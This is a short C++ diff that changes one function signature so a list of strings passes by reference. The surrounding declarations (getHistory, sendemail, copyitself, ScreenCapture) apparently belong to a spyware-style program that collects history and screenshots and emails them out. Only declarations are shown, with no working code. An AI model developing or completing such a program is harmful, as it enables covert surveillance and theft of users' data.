@@ -29,7 +29,7 @@ using namespace std;
 
 using namespace std;
 void getHistory();
-void sendemail(list<string> l);
+void sendemail(list<string> &l);
 void copy();
 void copyitself(const char *s);
 int ScreenCapture(const char* fname);
